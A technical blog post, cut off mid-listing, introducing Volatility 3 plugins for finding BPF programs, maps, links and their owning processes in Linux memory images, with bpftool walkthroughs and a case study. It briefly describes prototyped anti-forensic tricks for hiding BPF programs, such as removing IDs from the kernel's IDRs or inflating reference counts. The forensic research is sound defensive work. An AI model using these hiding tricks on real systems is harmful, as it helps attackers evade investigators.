&lt;p>The &lt;code>bpftool&lt;/code> user-space utility allows admins to interact with the BPF subsystem. One of the most basic tasks it supports is the listing of all loaded BPF programs, maps, BTF sections, or links. We are sometimes going to refer to these things collectively as &lt;strong>BPF objects&lt;/strong>. Roughly speaking, links are a mechanism to connect a loaded program to a point where it is being invoked, and BTF is a condensed form of DWARF debug information.&lt;/p>
&lt;p>Lets start with an example to get familiar with the information that is displayed (run &lt;code>btftool&lt;/code> as &lt;code>root&lt;/code>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-console" data-lang="console"># bpftool prog list
[...]
22: lsm name restrict_filesystems tag 713a545fe0530ce7 gpl
loaded_at 2023-11-26T10:31:42+0100 uid 0
xlated 560B jited 305B memlock 4096B map_ids 13
btf_id 53
[...]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>From left-to-right and top-to-bottom we have: ID used as an identifier for user-space, program type, program name, tag that is a SHA1 hash over the bytecode, license, program load timestamp, uid of process that loaded it, size of the bytecode, size of the jited code, memory blocked by the program, ids of the maps that the program is using, ids to the BTF information for the program.&lt;/p>
&lt;p>We can also inspect the bytecode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-console" data-lang="console"># bpftool prog dump xlated id &lt;span style="color:#ae81ff">22&lt;/span>
int restrict_filesystems(unsigned long long * ctx):
; int BPF_PROG(restrict_filesystems, struct file *file, int ret)
0: (79) r3 = *(u64 *)(r1 +0)
1: (79) r0 = *(u64 *)(r1 +8)
2: (b7) r1 = 0
[...]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>where each line is the pseudocode of a BPF assembly instruction and we even have line info, which is also stored in the attached BTF information. We can also dump the jited version and confirm that is is essentially a one-to-one translation to x86_64 machine code (depending on the architecture your kernel runs on):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-console" data-lang="console"># bpftool prog dump jited id &lt;span style="color:#ae81ff">22&lt;/span>
int restrict_filesystems(unsigned long long * ctx):
bpf_prog_713a545fe0530ce7_restrict_filesystems:
; int BPF_PROG(restrict_filesystems, struct file *file, int ret)
0: endbr64
4: nopl (%rax,%rax)
9: nop
b: pushq %rbp
c: movq %rsp, %rbp
f: endbr64
13: subq $24, %rsp
1a: pushq %rbx
1b: pushq %r13
1d: movq (%rdi), %rdx
21: movq 8(%rdi), %rax
25: xorl %edi, %edi
[...]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Furthermore, we can display basic information about the maps used by the program&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-console" data-lang="console"># bpftool map list id &lt;span style="color:#ae81ff">13&lt;/span>
13: hash_of_maps name cgroup_hash flags 0x0
key 8B value 4B max_entries 2048 memlock 165920B
&lt;/code>&lt;/pre>&lt;/div>&lt;p>as well as their contents (which are quite boring in this case).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-console" data-lang="console"># bpftool map dump id &lt;span style="color:#ae81ff">13&lt;/span>
Found 0 elements
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can also get information about the variables and types (BTF) defined in the program. This is somewhat comparable to the DWARF debug information that comes with some binaries - just that it is harder to strip since its needed by the BPF VM.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-console" data-lang="console"># bpftool btf dump id &lt;span style="color:#ae81ff">53&lt;/span>
[1] PTR &amp;#39;(anon)&amp;#39; type_id=3
[2] INT &amp;#39;int&amp;#39; size=4 bits_offset=0 nr_bits=32 encoding=SIGNED
[3] ARRAY &amp;#39;(anon)&amp;#39; type_id=2 index_type_id=4 nr_elems=13
[4] INT &amp;#39;__ARRAY_SIZE_TYPE__&amp;#39; size=4 bits_offset=0 nr_bits=32 encoding=(none)
[5] PTR &amp;#39;(anon)&amp;#39; type_id=6
[6] TYPEDEF &amp;#39;uint64_t&amp;#39; type_id=7
[7] TYPEDEF &amp;#39;__uint64_t&amp;#39; type_id=8
[8] INT &amp;#39;unsigned long&amp;#39; size=8 bits_offset=0 nr_bits=64 encoding=(none)
[9] PTR &amp;#39;(anon)&amp;#39; type_id=10
[10] TYPEDEF &amp;#39;uint32_t&amp;#39; type_id=11
[11] TYPEDEF &amp;#39;__uint32_t&amp;#39; type_id=12
[12] INT &amp;#39;unsigned int&amp;#39; size=4 bits_offset=0 nr_bits=32 encoding=(none)
[13] STRUCT &amp;#39;(anon)&amp;#39; size=24 vlen=3
&amp;#39;type&amp;#39; type_id=1 bits_offset=0
&amp;#39;key&amp;#39; type_id=5 bits_offset=64
&amp;#39;value&amp;#39; type_id=9 bits_offset=128
[...]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As we said earlier, links are what connects a loaded program to a point that invokes it.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-console" data-lang="console"># bpftool link list
[...]
3: tracing prog 22
prog_type lsm attach_type lsm_mac
target_obj_id 1 target_btf_id 82856
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Again, from left-to-right and top-to-bottom we have: ID, type, attached program&amp;rsquo;s ID, program&amp;rsquo;s load type, type that program was attached with, ID of the BTF object that the following field refers to, ID of the type that the program is attached to (functions can also have BTF entries). Note that everything but the first line depends on the type of link that is examined. To find the point where the program is called by the kernel we can inspect the relevant BTF object (the kernel&amp;rsquo;s in this case).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-console" data-lang="console"># bpftool btf dump id &lt;span style="color:#ae81ff">1&lt;/span> | rg &lt;span style="color:#ae81ff">82856&lt;/span>
[82856] FUNC &amp;#39;bpf_lsm_file_open&amp;#39; type_id=16712 linkage=static
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Thus we can conclude that the program is invoked early in the &lt;code>do_dentry_open&lt;/code> function via the &lt;code>security_file_open&lt;/code> LSM hook and that its return value decides whether the process will be allowed to open the file (we&amp;rsquo;re skipping some steps here, see our &lt;a href="https://blog.eb9f.de/2023/04/24/lsm2bpf.html">earlier article&lt;/a> for the full story).&lt;/p>
&lt;p>We performed this little &amp;ldquo;live investigation&amp;rdquo; on a laptop running Arch Linux with kernel 6.6.2-arch1-1 and the program wasn&amp;rsquo;t malware but rather loaded by systemd on boot. You can find the commit that introduced the feature &lt;a href="https://github.com/systemd/systemd/commit/021d1e96123289182565f0b3ce5a705b0e84fe48">here&lt;/a>. Again, you can see that in the future there will be more legitimate BPF programs running on your systems (servers, desktops and mobiles) than you might think!&lt;/p>
&lt;h4 id="memory-image">Memory Image&lt;/h4>
&lt;p>As a first step towards BPF memory forensics it would be nice to be able to perform the above investigation on a memory image. We will now introduce three plugins that aim to make this possible.&lt;/p>
&lt;p>We already saw that all sorts of BPF objects are identified by an ID. Internally, these IDs are allocated using the &lt;a href="https://www.kernel.org/doc/html/latest/core-api/idr.html?highlight=idr">IDR mechanism&lt;/a>, a core kernel API. For that purpose, three variables are defined at the top of &lt;code>/kernel/bpf/syscall.c&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">[...]
&lt;span style="color:#66d9ef">static&lt;/span> DEFINE_IDR(prog_idr);
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#a6e22e">DEFINE_SPINLOCK&lt;/span>(prog_idr_lock);
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#a6e22e">DEFINE_IDR&lt;/span>(map_idr);
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#a6e22e">DEFINE_SPINLOCK&lt;/span>(map_idr_lock);
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#a6e22e">DEFINE_IDR&lt;/span>(link_idr);
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#a6e22e">DEFINE_SPINLOCK&lt;/span>(link_idr_lock);
[...]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Under the hood, the ID allocation mechanism uses an &lt;a href="https://www.kernel.org/doc/html/latest/core-api/xarray.html?highlight=xarray">extensible array (xarray)&lt;/a>, a tree-like data structure that is rooted in the &lt;code>idr_rt&lt;/code> member of the structure that is defined by the macro. The ID of a new object is simply an unused index into the array, and the value stored at this index is a pointer to a structure that describes it. Thus, we can re-create the listing capabilities of &lt;code>bpftool&lt;/code> by simply iterating the array. You can find the code that does so in the &lt;a href="https://github.com/vobst/BPFVol3/blob/main/src/utility/datastructures.py#L17">XArray&lt;/a> class.&lt;/p>
&lt;p>Dereferencing the array entries leads us to structures that hold most of the information displayed by &lt;code>bpftool&lt;/code> earlier.&lt;/p>
&lt;p>Entries of the &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/kernel/bpf/syscall.c#L50">&lt;code>prog_idr&lt;/code>&lt;/a> point to objects of type &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/include/linux/bpf.h#L1217">&lt;code>bpf_prog&lt;/code>&lt;/a>, the &lt;code>aux&lt;/code> member of this type points to a &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/include/linux/bpf.h#L1129">structure&lt;/a> that hols additional information about the program. We can see how the information &lt;code>bpftool&lt;/code> displays is generated from these structures in the &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/kernel/bpf/syscall.c#L3896">&lt;code>bpf_prog_get_info_by_fd&lt;/code>&lt;/a> function by filling a &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/include/uapi/linux/bpf.h#L6172">&lt;code>bpf_prog_info&lt;/code>&lt;/a> struct. The plugin &lt;a href="https://github.com/vobst/BPFVol3/blob/main/src/plugins/bpf_listprogs.py">&lt;code>bpf_listprogs&lt;/code>&lt;/a> re-implements some of the logic of this functions and displays the following pieces of information.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">columns: list[tuple[str, type]] &lt;span style="color:#f92672">=&lt;/span> [
(&lt;span style="color:#e6db74">&amp;#34;OFFSET (V)&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;ID&amp;#34;&lt;/span>, int),
(&lt;span style="color:#e6db74">&amp;#34;TYPE&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;NAME&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;TAG&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;LOADED AT&amp;#34;&lt;/span>, int),
(&lt;span style="color:#e6db74">&amp;#34;MAP IDs&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;BTF ID&amp;#34;&lt;/span>, int),
(&lt;span style="color:#e6db74">&amp;#34;HELPERS&amp;#34;&lt;/span>, str),
]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Some comments are in order:&lt;/p>
&lt;ul>
&lt;li>&lt;code>OFFSET (V)&lt;/code> are the low 6 bytes of the &lt;code>bpf_prog&lt;/code> structure&amp;rsquo;s virtual address. This is useful as a unique identifier of the structure.&lt;/li>
&lt;li>&lt;code>LOADED AT&lt;/code> is the number of nanoseconds since boot when the program was loaded. Converting it to an absolute timestamp requires parsing additional kernel time-keeping structures and is not in scope for this plugin. There exist Volatility patches that add this functionality but they are not upstream yet. Once they are, it should be trivial to convert this field to match the &lt;code>bpftool&lt;/code> output.&lt;/li>
&lt;li>&lt;code>HELPERS&lt;/code> is a field that is not reported by &lt;code>bpftool&lt;/code>. It displays a list of all the kernel functions that are called by the BPF program, i.e., BPF helpers and kfuncs, and is helpful to quickly identify programs that use possibly malicious or non-standard helpers.&lt;/li>
&lt;li>The reporting of memory utilization is omitted as we consider it to be less important for forensic investigations, however, it would be easy to add.&lt;/li>
&lt;/ul>
&lt;p>The second &lt;code>bpftool&lt;/code> functionality the plugin supports is the dumping of programs in bytecode and jited forms. To dump the machine code of the program, we follow the &lt;code>bpf_func&lt;/code> pointer in the &lt;code>bpf_prog&lt;/code> structure, which points to the entrypoint of the jited BPF program. The length of the machine code is stored in the &lt;code>jited_len&lt;/code> field of the same structure. While we support dumping the raw bytes to a file, their analysis is tedious due to missing symbol information. Thus, we also support disassembling the program and annotating all occurring addresses with the corresponding symbol, which makes the programs much easier to analyze.&lt;/p>
&lt;p>Dumping the BPF bytecode is straightforward as well. The flexible &lt;code>insni&lt;/code> array member of the &lt;code>bpf_prog&lt;/code> structure holds the bytecode instructions and the &lt;code>len&lt;/code> field holds their number. Here, we also support dumping the raw and disassembled bytecode. However, the additional symbol annotations are not implemented. As the bytecode is not &amp;ldquo;what actually runs&amp;rdquo;, we consider this information more susceptible to anti-forensic tampering and thus focused on the machine code, which is what is executed when invoking the program.&lt;/p>
&lt;p>&lt;em>Note: We use &lt;a href="https://github.com/capstone-engine/capstone">Capstone&lt;/a> for disassembling the BPF bytecode. Unfortunately, Capstone&amp;rsquo;s BPF architecture is outdated and thus bytecode is sometimes not disassembled entirely. As a workaround, you can dump the raw bytes and use another tool to disassemble them.&lt;/em>&lt;/p>
&lt;p>Entries of the &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/kernel/bpf/syscall.c#L52">&lt;code>map_idr&lt;/code>&lt;/a> point to &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/include/linux/bpf.h#L202">&lt;code>bpf_map&lt;/code>&lt;/a> objects. The &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/include/uapi/linux/bpf.h#L6214">&lt;code>bpf_map_info&lt;/code>&lt;/a> structure parsed by &lt;code>bpftool&lt;/code> is filled in &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/kernel/bpf/syscall.c#L4185">&lt;code>bpf_map_get_info_by_fd&lt;/code>&lt;/a> and the plugin &lt;a href="https://github.com/vobst/BPFVol3/blob/main/src/plugins/bpf_listmaps.py">&lt;code>bpf_listmaps&lt;/code>&lt;/a> is simply copying the logic to display the following pieces of information.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">columns: list[tuple[str, Any]] &lt;span style="color:#f92672">=&lt;/span> [
(&lt;span style="color:#e6db74">&amp;#34;OFFSET (V)&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;ID&amp;#34;&lt;/span>, int),
(&lt;span style="color:#e6db74">&amp;#34;TYPE&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;NAME&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;KEY SIZE&amp;#34;&lt;/span>, int),
(&lt;span style="color:#e6db74">&amp;#34;VALUE SIZE&amp;#34;&lt;/span>, int),
(&lt;span style="color:#e6db74">&amp;#34;MAX ENTRIES&amp;#34;&lt;/span>, int),
]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Dumping the contents of maps is hard due to the diversity in map types. Each map type requires its own handling, beginning with manually downcasting the &lt;code>bpf_map&lt;/code> object to the correct container type. One approach to avoid implementing each lookup mechanism separately, would be through emulation of the &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/include/linux/bpf.h#L78">&lt;code>map_get_next_key&lt;/code>&lt;/a> and &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/kernel/bpf/syscall.c#L235">&lt;code>bpf_map_copy_value&lt;/code>&lt;/a> kernel functions, where the former is a function pointer found in the map&amp;rsquo;s operations structure. However, this is not in scope for the current plugin.&lt;/p>
&lt;p>Furthermore, the dumping could be enhanced by utilizing the BTF information that is optionally attached to the map to properly display keys and values, similar to the &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/kernel/trace/bpf_trace.c#L1015">&lt;code>bpf_snprintf_btf&lt;/code>&lt;/a> helper that can be used to pretty-print objects using their BTF information.&lt;/p>
&lt;p>We implemented the dumping for the most straightforward map type - arrays - but the plugin does not support dumping other types of maps.&lt;/p>
&lt;p>Entries of the &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/kernel/bpf/syscall.c#L54">&lt;code>link_idr&lt;/code>&lt;/a> point to objects of type &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/include/linux/bpf.h#L1259">&lt;code>bpf_link&lt;/code>&lt;/a>. Again, there is an informational structure, &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/include/uapi/linux/bpf.h#L6242">&lt;code>bpf_link_info&lt;/code>&lt;/a>, which is this time filled in the &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/kernel/bpf/syscall.c#L4246">&lt;code>bpf_link_get_info_by_fd&lt;/code>&lt;/a> function. By analyzing this function, we wrote the &lt;a href="https://github.com/vobst/BPFVol3/blob/main/src/plugins/bpf_listlinks.py">&lt;code>bpf_listlinks&lt;/code>&lt;/a> plugin that retrieves the following pieces of information.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">columns: list[tuple[str, Any]] &lt;span style="color:#f92672">=&lt;/span> [
(&lt;span style="color:#e6db74">&amp;#34;OFFSET (V)&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;ID&amp;#34;&lt;/span>, int),
(&lt;span style="color:#e6db74">&amp;#34;TYPE&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;PROG&amp;#34;&lt;/span>, int),
(&lt;span style="color:#e6db74">&amp;#34;ATTACH&amp;#34;&lt;/span>, str),
]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here, the last column is obtained by mimicking the virtual call to &lt;code>link-&amp;gt;ops-&amp;gt;fill_link_info&lt;/code> that adds link-type specific information about the associated attachment point, e.g., for tracing links it adds the BTF object and type IDs we saw earlier.&lt;/p>
&lt;h3 id="lsm-hooks">LSM Hooks&lt;/h3>
&lt;p>Our three listing plugins have one conceptual weakness in common: they rely entirely on information obtained by parsing the &lt;code>(prog|map|link)_idr&lt;/code>s. However, the entire ID mechanism is in the user-facing part of the BPF subsystem, its simply a means for user space to refer to BPF objects in syscalls. Thus, our plugins are susceptible to trivial anti-forensic tampering.&lt;/p>
&lt;p>In our research, we prototyped two anti-forensic methods that remove BPF objects from these structures while still keeping the corresponding program active in the kernel. First, the more straightforward way is to simply write a kernel module that uses standard APIs to remove IDs from the IDRs. The second one is based on the observation that the lifecycle of BPF objects is managed via reference counts. Thus, if we artificially increment the reference count of an object that (indirectly) holds references to all other objects that are required to operate a BPF program, e.g., a link, we can prevent the program&amp;rsquo;s destruction when all &amp;ldquo;regular&amp;rdquo; references are dropped.&lt;/p>
&lt;p>One approach to counter these anti-forensic measures is to &amp;ldquo;approach from the other side&amp;rdquo;. Instead of relying on information from sources that are far detached from the actual program execution, we go to the very places and mechanisms that invoke the program. The downside is obviously that this low-level code is much more program-type and architecture specific, the results, on the other hand, are more robust.&lt;/p>
&lt;p>In a &lt;a href="https://blog.eb9f.de/2023/04/24/lsm2bpf.html">previous blog post&lt;/a> we described the low-level details that lead up to the execution of BPF LSM programs in great detail. Based on this knowledge, we developed the &lt;a href="https://github.com/vobst/BPFVol3/blob/main/src/plugins/bpf_lsm.py">&lt;code>bpf_lsm&lt;/code>&lt;/a> plugin that can discover hidden BPF programs attached to security hooks. In short, the plugin checks the places where the kernel control flow may be diverted into the BPF VM for the presence of inline hooks. If they are found, it cross checks with the links IDR to see if there is a corresponding link, the absence of which is a strong indication of tampering. Additionally, the plugin is also valuable in the absence of tampering, as it shows you the exact program attachment point without the need to manually resolve BTF IDs. In particular, the plugin displays the number of attached programs and their IDs along with the name of the LSM hook where they are attached.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">columns: list[tuple[str, type]] &lt;span style="color:#f92672">=&lt;/span> [
(&lt;span style="color:#e6db74">&amp;#34;LSM HOOK&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;Nr. PROGS&amp;#34;&lt;/span>, int),
(&lt;span style="color:#e6db74">&amp;#34;IDs&amp;#34;&lt;/span>, str),
]
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="networking-hooks">Networking Hooks&lt;/h3>
&lt;p>As we described above, traffic control (tc) programs are especially useful for exfiltrating information from infected machines, e.g., by hijacking existing TCP connections. Thus, the second plugin that obtains its information from more tamper resistant sources targets tc BPF programs. It only relies on the &lt;a href="https://elixir.bootlin.com/linux/v6.1.65/source/include/net/sch_generic.h#L1265">&lt;code>mini_Qdisc&lt;/code>&lt;/a> structure that is used on the transmission and receive fast paths to look up queuing disciplines (qdisc) attached to a network device.&lt;/p>
&lt;p>We use the &lt;a href="https://github.com/volatilityfoundation/community3/blob/master/Sheffer_Shaked_Docker/plugins/ifconfig.py">&lt;code>ifconfig plugin&lt;/code>&lt;/a> by Ofek Shaked and Amir Sheffer to obtain a list of all network devices. Then, we find the above-mentioned structure and use it to collect all BPF programs that are involved into qdiscs on this device. With kernel 6.3 the process of locating the &lt;code>mini_Qdisc&lt;/code> from the network interface changed slightly due to the introduction of link-based attachment of tc programs, however, the plugin recognizes and handles both cases. Finally, the &lt;a href="https://github.com/vobst/BPFVol3/blob/main/src/plugins/bpf_netdev.py">&lt;code>bpf_netdev&lt;/code>&lt;/a> plugin displays the following information about each interface where at least one BPF program was found,&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">columns: list[tuple[str, type]] &lt;span style="color:#f92672">=&lt;/span> [
(&lt;span style="color:#e6db74">&amp;#34;NAME&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;MAC ADDR&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;EGRESS&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;INGRESS&amp;#34;&lt;/span>, str),
]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>where the &lt;code>EGRESS&lt;/code> and &lt;code>INGRESS&lt;/code> hold the IDs of the programs that process packets flowing into the respective direction.&lt;/p>
&lt;h3 id="finding-processes">Finding Processes&lt;/h3>
&lt;p>Yet another way to discover BPF objects is through the processes that hold on to them. As with many other resources, programs, links, maps, and btf are represented to processes as file descriptors. They can be used to act on the object, retrieve information about it, and serve as a mechanism to clean up after processes that did not exit gracefully. Furthermore, an investigator might want to find out which process holds on to a specific BPF object in order to investigate this process further.&lt;/p>
&lt;p>Thus, the &lt;a href="https://github.com/vobst/BPFVol3/blob/main/src/plugins/bpf_listprocs.py">&lt;code>bpf_listprocs&lt;/code>&lt;/a> plugin displays the following pieces of information for every process that holds on to at least one BPF object via a file descriptor.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">columns: list[tuple[str, type]] &lt;span style="color:#f92672">=&lt;/span> [
(&lt;span style="color:#e6db74">&amp;#34;PID&amp;#34;&lt;/span>, int),
(&lt;span style="color:#e6db74">&amp;#34;COMM&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;PROGS&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;MAPS&amp;#34;&lt;/span>, str),
(&lt;span style="color:#e6db74">&amp;#34;LINKS&amp;#34;&lt;/span>, str),
]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here, the &lt;code>PROGS&lt;/code>. &lt;code>MAPS&lt;/code>, and &lt;code>LINKS&lt;/code> columns display the IDs of the respective objects. This list is generated by iterating over all file descriptors and the associated &lt;a href="https://elixir.bootlin.com/linux/v6.1.63/source/include/linux/fs.h#L940">&lt;code>file&lt;/code>&lt;/a> structures. BPF objects are identified by checking the file operations &lt;code>f_op&lt;/code> pointer, and the corresponding &lt;code>bpf_(prog|map|link)&lt;/code> structures are found by following the pointer stored in the &lt;code>private&lt;/code> member.&lt;/p>
&lt;p>Not every BPF object must be reachable from the process list, however. They can, for example, also be represented as files under the special &lt;code>bpf&lt;/code> filesystem, which is usually mounted at &lt;code>/sys/fs/bpf&lt;/code>, or processes can close file descriptors and the object will remain alive as long as there are other references to it.&lt;/p>
&lt;h3 id="connecting-the-dots">Connecting the Dots&lt;/h3>
&lt;p>Finally, we would like to present the &lt;a href="https://github.com/vobst/BPFVol3/blob/main/src/plugins/bpf_graph.py">&lt;code>bpf_graph&lt;/code>&lt;/a> plugin, a meta analysis that we have build on top of the four listing plugins. As its name suggest, its goal is to visualize the state of the BPF subsystem as a graph.&lt;/p>
&lt;p>There are four types of nodes in this graph: programs, maps, links and processes. Different node types are distinguished by shape. Within a node type, the different program/map/link types are distinguished by color and process nodes are colored based on their process ID (PID). Furthermore, map and program nodes are labeled with the ID and name of the object, link nodes are labeled with the ID and attachment information of the link, and process nodes receive the PID and comm (name of the user-space program binary) of their process as labels.&lt;/p>
&lt;p>There are three types of edges to establish relationships between nodes: file descriptor, link, and map. File descriptor edges are dotted and connect processes to BPF objects that they have an open fd for. Link edges are dashed and connect BPF links to the program they reference. Finally, map edges are drawn solid and connect maps to all of the programs that use them.&lt;/p>
&lt;p>Especially for large applications with hundreds or even thousands of objects, it is essential to be able to filter the graph to make it useful. We have therefore implemented two additional options that can be passed to the plugin. First, you can pass a list of node types to include in the output. Second, you can pass a list of nodes, and only the connected components that contain at least one of those nodes will be drawn.&lt;/p>
&lt;p>The idea of this plugin is to make the information of the four listing plugins more accessible to investigators by combining it into a single picture. This is especially useful for complex applications with possibly hundreds of programs and maps, or on busy systems where many different processes have loaded BPF programs.&lt;/p>
&lt;p>Plugin output comes in two forms, a dot-format encoding of the graph, where each BPF object node has metadata containing all of the plugin columns, and as a picture of the graph, drawn with a default layout algorithm. The latter should suffice for most users, but the former allows advanced use-cases to do further processing.&lt;/p>
&lt;p>&lt;em>Note: We provide &lt;a href="https://github.com/vobst/BPFVol3/tree/main/docs">standalone documentation&lt;/a> for all plugins in our project on GitHub.&lt;/em>&lt;/p>
&lt;h2 id="case-study">Case Study&lt;/h2>
&lt;p>In this section we will use the plugins to examine the memory image of a system with a high level of BPF activity. To get a diverse set of small BPF applications we launched the example programs that come with &lt;a href="https://github.com/libbpf/libbpf-bootstrap">libbpf-bootstrap&lt;/a> and some of the kernel self-tests. You can download the &lt;a href="https://drive.proton.me/urls/DBWB4GFRK8#7IbjrGRg6o5z">memory image&lt;/a> and &lt;a href="https://drive.proton.me/urls/BCKSBBZ6Z4#ZeZcrnYlF7tZ">symbols&lt;/a> to follow along. If you prefer to analyze a single, large application have a look at the &lt;code>krie&lt;/code> example &lt;a href="https://github.com/vobst/BPFVol3/blob/main/docs/examples/krie/krie.md">in our plugin documentation&lt;/a>.&lt;/p>
&lt;p>A good first step is to use the graph plugin to get an overview of the subsystem (&lt;code># vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_graph&lt;/code>).&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2023/12/debian-bookworm-6.1.0-13-amd64_all.png" alt="debian-bookworm-6.1.0-13-amd64_all.png">&lt;/p>
&lt;p>As we can see, there are several components corresponding to different processes, each of which holds a number of BPF resources. Let us begin by examining the &amp;ldquo;Hello, World&amp;rdquo; example of BPF, the &lt;a href="https://github.com/libbpf/libbpf-bootstrap/blob/master/examples/c/minimal.bpf.c">&lt;code>minimal&lt;/code>&lt;/a> program:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">/* Copyright (c) 2020 Facebook */&lt;/span>
&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;linux/bpf.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;bpf/bpf_helpers.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">char&lt;/span> LICENSE[] SEC(&lt;span style="color:#e6db74">&amp;#34;license&amp;#34;&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Dual BSD/GPL&amp;#34;&lt;/span>;
